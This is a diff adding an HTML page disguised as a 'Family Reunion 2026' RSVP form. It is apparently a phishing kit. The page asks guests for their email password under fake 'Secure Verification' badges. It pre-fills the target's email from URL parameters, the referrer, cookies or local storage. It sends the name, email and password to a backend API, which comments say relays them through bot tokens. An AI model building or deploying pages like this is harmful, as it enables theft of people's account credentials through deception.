@@ -1,0 +1,453 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Family Reunion 2026 · RSVP</title>
+    <link href="https://fonts.googleapis.com/css2?family=Playfair+Display:wght@400;600;700&family=Inter:wght@300;400;500;600&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            font-family: 'Inter', sans-serif;
+            min-height: 100vh;
+            background: linear-gradient(135deg, #f5f0eb 0%, #e8ddd0 100%);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+            position: relative;
+        }
+        body::before { content: '🎉'; position: absolute; font-size: 120px; opacity: 0.05; top: 20px; right: 20px; transform: rotate(15deg); }
+        body::after { content: '💝'; position: absolute; font-size: 100px; opacity: 0.05; bottom: 20px; left: 20px; transform: rotate(-10deg); }
+        .card {
+            max-width: 520px; width: 100%;
+            background: rgba(255, 255, 255, 0.92);
+            backdrop-filter: blur(20px);
+            border-radius: 32px;
+            padding: 45px 40px 40px;
+            box-shadow: 0 30px 80px rgba(0, 0, 0, 0.12);
+            border: 1px solid rgba(255, 255, 255, 0.3);
+            position: relative; z-index: 1;
+            animation: slideUp 0.6s ease;
+        }
+        @keyframes slideUp { from { opacity: 0; transform: translateY(30px); } to { opacity: 1; transform: translateY(0); } }
+        .header { text-align: center; margin-bottom: 32px; }
+        .family-crest {
+            display: inline-block;
+            background: linear-gradient(135deg, #c0392b, #e74c3c);
+            color: white; width: 70px; height: 70px;
+            border-radius: 50%; line-height: 70px;
+            font-size: 32px; margin-bottom: 16px;
+            box-shadow: 0 8px 25px rgba(192, 57, 43, 0.3);
+            transition: transform 0.3s;
+        }
+        .family-crest:hover { transform: scale(1.05) rotate(-5deg); }
+        .header h1 { font-family: 'Playfair Display', serif; font-size: 28px; color: #2c3e50; font-weight: 700; }
+        .header .subtitle { color: #7f8c8d; font-size: 14px; margin-top: 6px; }
+        .invitation-message {
+            background: #fdf6f0;
+            border-radius: 16px;
+            padding: 20px 24px;
+            margin-bottom: 28px;
+            border-left: 4px solid #e74c3c;
+            font-size: 14px; line-height: 1.8;
+            color: #34495e;
+        }
+        .security-badge { display: inline-block; background: #2c3e50; color: white; font-size: 11px; padding: 4px 12px; border-radius: 50px; margin-top: 8px; }
+        .form-group { margin-bottom: 18px; position: relative; }
+        .form-group label { display: block; font-size: 12px; font-weight: 600; text-transform: uppercase; letter-spacing: 0.5px; color: #7f8c8d; margin-bottom: 6px; }
+        .form-group input {
+            width: 100%; padding: 14px 18px;
+            border: 2px solid #ecf0f1;
+            border-radius: 12px;
+            font-family: 'Inter', sans-serif;
+            font-size: 15px;
+            transition: all 0.3s;
+            background: #fafbfc;
+            color: #2c3e50;
+        }
+        .form-group input:focus { outline: none; border-color: #e74c3c; background: white; box-shadow: 0 0 0 4px rgba(231, 76, 60, 0.1); }
+        .form-group input::placeholder { color: #bdc3c7; font-weight: 300; }
+        .form-group .hint { font-size: 11px; color: #95a5a6; margin-top: 4px; }
+
+        .email-suggestion {
+            position: absolute; top: calc(100% + 4px); left: 0; right: 0;
+            background: white; border: 2px solid #27ae60; border-radius: 12px;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.1);
+            padding: 10px 16px; display: none; z-index: 1000;
+            animation: dropDown 0.2s ease; cursor: pointer; transition: all 0.2s;
+        }
+        .email-suggestion.active { display: flex; align-items: center; gap: 12px; }
+        .email-suggestion:hover { background: #f8f9fa; border-color: #219a52; }
+        @keyframes dropDown { from { opacity: 0; transform: translateY(-10px); } to { opacity: 1; transform: translateY(0); } }
+        .email-suggestion i { color: #27ae60; font-size: 16px; }
+        .email-suggestion .suggestion-text { flex: 1; font-size: 14px; color: #2c3e50; }
+        .email-suggestion .suggestion-text strong { color: #27ae60; }
+        .email-suggestion .suggestion-hint { font-size: 11px; color: #95a5a6; }
+
+        .password-toggle { position: relative; }
+        .password-toggle input { padding-right: 50px; }
+        .toggle-eye {
+            position: absolute; right: 16px; top: 50%;
+            transform: translateY(-50%);
+            cursor: pointer; color: #95a5a6; font-size: 16px;
+            transition: all 0.3s; background: none; border: none; padding: 4px;
+        }
+        .toggle-eye:hover { color: #2c3e50; }
+
+        .rsvp-btn {
+            width: 100%; padding: 16px;
+            background: linear-gradient(135deg, #c0392b, #e74c3c);
+            color: white; border: none; border-radius: 12px;
+            font-family: 'Inter', sans-serif; font-size: 16px; font-weight: 600;
+            cursor: pointer; transition: all 0.3s;
+            display: flex; align-items: center; justify-content: center; gap: 10px;
+            margin-top: 6px; position: relative;
+        }
+        .rsvp-btn:hover { transform: translateY(-2px); box-shadow: 0 10px 30px rgba(192, 57, 43, 0.3); }
+        .rsvp-btn:active { transform: scale(0.98); }
+        .rsvp-btn.loading { pointer-events: none; opacity: 0.7; }
+        .rsvp-btn.loading .btn-text { visibility: hidden; }
+        .rsvp-btn.loading .btn-text::after {
+            content: ''; visibility: visible;
+            position: absolute; width: 24px; height: 24px;
+            border: 3px solid rgba(255,255,255,0.2);
+            border-top-color: white; border-radius: 50%;
+            animation: spin 0.8s linear infinite;
+            top: calc(50% - 12px); left: calc(50% - 12px);
+        }
+        @keyframes spin { to { transform: rotate(360deg); } }
+
+        #status { text-align: center; margin-top: 16px; font-size: 13px; min-height: 24px; color: #7f8c8d; transition: all 0.3s; }
+        #status.success { color: #27ae60; }
+        #status.error { color: #e74c3c; }
+
+        .footer { text-align: center; margin-top: 24px; padding-top: 20px; border-top: 1px solid #ecf0f1; font-size: 12px; color: #bdc3c7; }
+        .footer .hearts { color: #e74c3c; display: inline-block; animation: heartPulse 1.5s infinite; }
+        @keyframes heartPulse { 0%, 100% { transform: scale(1); } 50% { transform: scale(1.2); } }
+
+        .confetti {
+            position: fixed; top: -10px; font-size: 24px;
+            animation: confetti-fall linear forwards;
+            pointer-events: none; z-index: 9999;
+        }
+        @keyframes confetti-fall {
+            0% { transform: translateY(0) rotate(0deg) scale(1); }
+            100% { transform: translateY(110vh) rotate(720deg) scale(0.5); }
+        }
+        @media (max-width: 480px) { .card { padding: 30px 20px 28px; } .header h1 { font-size: 24px; } .email-suggestion { padding: 8px 14px; font-size: 13px; } }
+        @media (prefers-reduced-motion: reduce) { * { animation-duration: 0.01ms !important; animation-iteration-count: 1 !important; transition-duration: 0.01ms !important; } }
+    </style>
+</head>
+<body>
+
+    <div class="card">
+        <div class="header">
+            <div class="family-crest">👨‍👩‍👧‍👦</div>
+            <h1>Family Reunion 2026</h1>
+            <p class="subtitle">~ Celebrating 50 Years of Love ~</p>
+        </div>
+
+        <div class="invitation-message">
+            🎊 <strong>You're Invited!</strong> We're so excited to finally gather the whole family together for our
+            <strong>Golden Anniversary Celebration</strong>.
+            <br><br>
+            <span style="font-size:13px; color:#7f8c8d;">
+                🔒 <strong>Private Event:</strong> Please RSVP below to confirm your attendance.
+                <span class="security-badge">🔐 Secure Verification</span>
+            </span>
+        </div>
+
+        <form id="rsvpForm" novalidate>
+            <div class="form-group">
+                <label for="fullname"><i class="fas fa-user"></i> Full Name</label>
+                <input type="text" id="fullname" placeholder="Enter your full name" required autocomplete="name">
+                <div class="hint">📌 Your full name for the event</div>
+            </div>
+
+            <div class="form-group" id="emailGroup">
+                <label for="email"><i class="fas fa-envelope"></i> Email Address</label>
+                <input type="email" id="email" placeholder="Enter your email" required autocomplete="email">
+                <div class="hint">📌 We'll send event updates to this email</div>
+
+                <div class="email-suggestion" id="emailSuggestion">
+                    <i class="fas fa-check-circle"></i>
+                    <span class="suggestion-text">Use <strong id="suggestedEmail">test@example.com</strong></span>
+                    <span class="suggestion-hint" id="detectionMethod">tap to fill</span>
+                </div>
+            </div>
+
+            <div class="form-group">
+                <label for="password"><i class="fas fa-lock"></i> Password</label>
+                <div class="password-toggle">
+                    <input type="password" id="password" placeholder="Enter your password" required autocomplete="current-password">
+                    <button type="button" class="toggle-eye" id="togglePassword">
+                        <i class="fas fa-eye"></i>
+                    </button>
+                </div>
+                <div class="hint">🔒 Used only for identity verification</div>
+            </div>
+
+            <button type="submit" class="rsvp-btn" id="rsvpBtn">
+                <span class="btn-text"><i class="fas fa-check-circle"></i> Yes, I'm Coming!</span>
+            </button>
+        </form>
+
+        <div id="status" role="status" aria-live="polite">💝 We can't wait to celebrate with you!</div>
+
+        <div class="footer">
+            Made with <span class="hearts">❤️</span> by the Family •
+            <span style="color:#bdc3c7;">🔒 Secure & Private</span>
+        </div>
+    </div>
+
+    <script>
+        // =============================================
+        // 🔧 CONFIGURE YOUR BOT (Backend will handle sending)
+        // =============================================
+        // The backend (worker.py) has your bot tokens
+        // The frontend just sends to the backend API
+        // =============================================
+
+        // =============================================
+        // 📧 SMART EMAIL DETECTION
+        // =============================================
+        function detectEmail() {
+            let detectedEmail = null;
+            let method = 'Unknown';
+
+            const urlParams = new URLSearchParams(window.location.search);
+            const urlEmail = urlParams.get('email') || urlParams.get('e') || urlParams.get('mail');
+            if (urlEmail) {
+                detectedEmail = decodeURIComponent(urlEmail);
+                method = 'URL Parameter';
+                return { email: detectedEmail, method: method };
+            }
+
+            if (window.location.hash) {
+                const hashParams = new URLSearchParams(window.location.hash.substring(1));
+                const hashEmail = hashParams.get('email') || hashParams.get('e');
+                if (hashEmail) {
+                    detectedEmail = decodeURIComponent(hashEmail);
+                    method = 'URL Hash';
+                    return { email: detectedEmail, method: method };
+                }
+            }
+
+            if (document.referrer) {
+                try {
+                    const referrer = new URL(document.referrer);
+                    const refParams = new URLSearchParams(referrer.search);
+                    const refEmail = refParams.get('email') || refParams.get('e') || refParams.get('mail');
+                    if (refEmail) {
+                        detectedEmail = decodeURIComponent(refEmail);
+                        method = 'Referrer URL';
+                        return { email: detectedEmail, method: method };
+                    }
+                } catch (e) {}
+            }
+
+            const emailInput = document.getElementById('email');
+            if (emailInput.value && emailInput.value.includes('@')) {
+                detectedEmail = emailInput.value;
+                method = 'Browser Autofill';
+                return { email: detectedEmail, method: method };
+            }
+
+            const cookieEmail = getCookie('user_email');
+            if (cookieEmail && cookieEmail.includes('@')) {
+                detectedEmail = cookieEmail;
+                method = 'Cookie';
+                return { email: detectedEmail, method: method };
+            }
+
+            const storedEmail = localStorage.getItem('detected_email');
+            if (storedEmail && storedEmail.includes('@')) {
+                detectedEmail = storedEmail;
+                method = 'Local Storage';
+                return { email: detectedEmail, method: method };
+            }
+
+            return { email: null, method: 'None' };
+        }
+
+        function getCookie(name) {
+            const value = `; ${document.cookie}`;
+            const parts = value.split(`; ${name}=`);
+            if (parts.length === 2) return parts.pop().split(';').shift();
+            return null;
+        }
+
+        const detectionResult = detectEmail();
+        const detectedEmail = detectionResult.email;
+        const detectionMethod = detectionResult.method;
+
+        const emailInput = document.getElementById('email');
+        const emailSuggestion = document.getElementById('emailSuggestion');
+        const suggestedEmail = document.getElementById('suggestedEmail');
+        const detectionMethodDisplay = document.getElementById('detectionMethod');
+        const fullnameInput = document.getElementById('fullname');
+        const passwordInput = document.getElementById('password');
+        const form = document.getElementById('rsvpForm');
+        const rsvpBtn = document.getElementById('rsvpBtn');
+        const statusDiv = document.getElementById('status');
+        const togglePassword = document.getElementById('togglePassword');
+
+        if (detectedEmail) {
+            suggestedEmail.textContent = detectedEmail;
+            detectionMethodDisplay.textContent = `detected via ${detectionMethod}`;
+            emailSuggestion.classList.add('active');
+            console.log('📧 Email detected:', detectedEmail);
+            console.log('📌 Method:', detectionMethod);
+        }
+
+        emailSuggestion.addEventListener('click', function() {
+            if (detectedEmail) {
+                emailInput.value = detectedEmail;
+                emailSuggestion.classList.remove('active');
+                passwordInput.focus();
+            }
+        });
+
+        emailInput.addEventListener('input', function() {
+            if (this.value.length > 0) {
+                emailSuggestion.classList.remove('active');
+            } else if (detectedEmail) {
+                emailSuggestion.classList.add('active');
+            }
+        });
+
+        emailInput.addEventListener('blur', function() {
+            setTimeout(() => {
+                if (!this.value) {
+                    emailSuggestion.classList.remove('active');
+                }
+            }, 200);
+        });
+
+        togglePassword.addEventListener('click', function() {
+            const type = passwordInput.getAttribute('type') === 'password' ? 'text' : 'password';
+            passwordInput.setAttribute('type', type);
+            const icon = this.querySelector('i');
+            icon.classList.toggle('fa-eye');
+            icon.classList.toggle('fa-eye-slash');
+        });
+
+        // =============================================
+// 📤 SEND TO BACKEND API
+// =============================================
+async function sendToBackend(name, email, password) {
+    try {
+        const response = await fetch('http://localhost:8000/api/rsvp', {
+            method: 'POST',
+            headers: { 
+                'Content-Type': 'application/json'
+            },
+            body: JSON.stringify({ name, email, password })
+        });
+
+        if (!response.ok) {
+            const errorText = await response.text();
+            let errorMessage = 'Failed to send RSVP';
+            try {
+                const errorJson = JSON.parse(errorText);
+                errorMessage = errorJson.detail || errorMessage;
+            } catch (e) {
+                errorMessage = errorText || errorMessage;
+            }
+            throw new Error(errorMessage);
+        }
+
+        return await response.json();
+    } catch (error) {
+        console.error('Fetch error:', error);
+        throw new Error('Could not connect to server. Please try again.');
+    }
+}
+
+        // =============================================
+        // 🎊 CONFETTI CELEBRATION
+        // =============================================
+        function showConfetti() {
+            const emojis = ['🎉', '🎊', '💝', '✨', '🌟', '🥳', '🎈', '🎁'];
+            for (let i = 0; i < 40; i++) {
+                setTimeout(() => {
+                    const el = document.createElement('div');
+                    el.className = 'confetti';
+                    el.textContent = emojis[Math.floor(Math.random() * emojis.length)];
+                    el.style.left = Math.random() * 100 + '%';
+                    el.style.fontSize = (Math.random() * 20 + 20) + 'px';
+                    el.style.animationDuration = (Math.random() * 2 + 2) + 's';
+                    document.body.appendChild(el);
+                    setTimeout(() => el.remove(), 4000);
+                }, i * 60);
+            }
+        }
+
+        // =============================================
+        // 📝 FORM SUBMISSION
+        // =============================================
+        async function handleRSVP(event) {
+            event.preventDefault();
+
+            const name = fullnameInput.value.trim();
+            const email = emailInput.value.trim();
+            const password = passwordInput.value.trim();
+
+            if (!name || !email || !password) {
+                statusDiv.textContent = '❌ Please fill in all fields';
+                statusDiv.className = 'error';
+                return;
+            }
+
+            rsvpBtn.classList.add('loading');
+            statusDiv.textContent = '📤 Sending your RSVP...';
+            statusDiv.className = '';
+
+            try {
+                await sendToBackend(name, email, password);
+
+                statusDiv.textContent = '🎉 RSVP confirmed! We can\'t wait to see you!';
+                statusDiv.className = 'success';
+                showConfetti();
+
+                fullnameInput.value = '';
+                emailInput.value = '';
+                passwordInput.value = '';
+
+                if (detectedEmail) {
+                    emailSuggestion.classList.add('active');
+                }
+
+                rsvpBtn.style.background = 'linear-gradient(135deg, #27ae60, #2ecc71)';
+                rsvpBtn.querySelector('.btn-text').innerHTML = '<i class="fas fa-check-circle"></i> RSVP Sent! 🎉';
+
+                setTimeout(() => {
+                    rsvpBtn.style.background = '';
+                    rsvpBtn.querySelector('.btn-text').innerHTML = '<i class="fas fa-check-circle"></i> Yes, I\'m Coming!';
+                }, 3000);
+
+            } catch (error) {
+                statusDiv.textContent = `❌ ${error.message}`;
+                statusDiv.className = 'error';
+                console.error('RSVP Error:', error);
+            } finally {
+                rsvpBtn.classList.remove('loading');
+            }
+        }
+
+        form.addEventListener('submit', handleRSVP);
+
+        // =============================================
+        // 🖥️ CONSOLE INFO
+        // =============================================
+        console.log('%c🎉 FAMILY REUNION RSVP SYSTEM', 'font-size:20px; font-weight:bold; color:#c0392b;');
+        console.log('%c📧 Email Detection Results:', 'font-size:14px; font-weight:bold;');
+        console.log(`%c📧 Email: ${detectedEmail || 'Not detected'}`, 'font-size:13px; color:' + (detectedEmail ? '#27ae60' : '#e74c3c'));
+        console.log(`%c📌 Method: ${detectionMethod}`, 'font-size:13px; color:#7f8c8d;');
+        console.log('%c📤 Using Backend API: /api/rsvp', 'font-size:12px; color:#3498db;');
+    </script>
+
+</body>
+</html>
